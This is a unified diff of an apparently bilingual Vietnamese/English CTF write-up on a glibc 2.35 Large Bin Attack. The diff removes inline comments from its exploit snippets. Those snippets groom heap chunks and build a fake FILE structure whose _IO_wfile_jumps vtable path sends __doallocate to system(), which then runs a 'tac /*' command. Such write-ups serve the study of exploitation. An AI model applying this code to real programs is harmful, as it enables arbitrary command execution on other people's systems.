@@ -54,10 +54,10 @@ flowchart TD
 5. **Chunk `S`** (`idx 4`, size `0x520`) và **`T`** (`idx 5`, size `0x500`): Dùng để kích hoạt quá trình duyệt Unsorted Bin và sort các chunk vào Large Bin.
 
 ```python
-create(0, 0x448, b'A' * 0x448)                  # Chunk A (0x450)
-create(1, 0x18,  b'X' * 0x10 + b'tac /*\x00')   # Guard GA
-create(2, 0x438, b'\x00' * 0x438)               # Chunk Z (0x440)
-create(3, 0x18,  b'Y' * 0x18)                   # Guard GZ
+create(0, 0x448, b'A' * 0x448)
+create(1, 0x18,  b'X' * 0x10 + b'tac /*\x00')
+create(2, 0x438, b'\x00' * 0x438)
+create(3, 0x18,  b'Y' * 0x18)
 ```
 
 ---
@@ -127,12 +127,12 @@ Cấu trúc giả lập bên trong chunk `Z` (địa chỉ $V$):
 z = bytearray(0x438)
 def put(off, data): z[off:off+len(data)] = data
 
-put(0x78, p64(V + 0x200))                     # _lock
-put(0x90, p64(V + 0x180))                     # _wide_data
-put(0xb0, p32(0))                             # _mode = 0
-put(0xc8, p64(libc + IO_WFILE_JUMPS))          # vtable = _IO_wfile_jumps
-put(0x250, p64(V + 0x380))                    # _wide_data->_wide_vtable
-put(0x3d8, p64(libc + SYSTEM))                # __doallocate = system()
+put(0x78, p64(V + 0x200))
+put(0x90, p64(V + 0x180))
+put(0xb0, p32(0))
+put(0xc8, p64(libc + IO_WFILE_JUMPS))
+put(0x250, p64(V + 0x380))
+put(0x3d8, p64(libc + SYSTEM))
 
 edit(2, bytes(z))
 ```
@@ -206,10 +206,10 @@ To perform a Large Bin Attack in glibc 2.35, you need two chunks of different si
 5. **Chunk `S`** (`idx 4`, size `0x520`) and **`T`** (`idx 5`, size `0x500`): Used to activate the Unsorted Bin browsing process and sort chunks into Large Bin.
 
 ```python
-create(0, 0x448, b'A' * 0x448)                  # Chunk A (0x450)
-create(1, 0x18,  b'X' * 0x10 + b'tac /*\x00')   # Guard GA
-create(2, 0x438, b'\x00' * 0x438)               # Chunk Z (0x440)
-create(3, 0x18,  b'Y' * 0x18)                   # Guard GZ
+create(0, 0x448, b'A' * 0x448)
+create(1, 0x18,  b'X' * 0x10 + b'tac /*\x00')
+create(2, 0x438, b'\x00' * 0x438)
+create(3, 0x18,  b'Y' * 0x18)
 ```
 
 ---
@@ -278,12 +278,12 @@ Emulator structure inside chunk `Z` (address $V$):
 z = bytearray(0x438)
 def put(off, data): z[off:off+len(data)] = data
 
-put(0x78, p64(V + 0x200))                     # _lock
-put(0x90, p64(V + 0x180))                     # _wide_data
-put(0xb0, p32(0))                             # _mode = 0
-put(0xc8, p64(libc + IO_WFILE_JUMPS))          # vtable = _IO_wfile_jumps
-put(0x250, p64(V + 0x380))                    # _wide_data->_wide_vtable
-put(0x3d8, p64(libc + SYSTEM))                # __doallocate = system()
+put(0x78, p64(V + 0x200))
+put(0x90, p64(V + 0x180))
+put(0xb0, p32(0))
+put(0xc8, p64(libc + IO_WFILE_JUMPS))
+put(0x250, p64(V + 0x380))
+put(0x3d8, p64(libc + SYSTEM))
 
 edit(2, bytes(z))
 ```
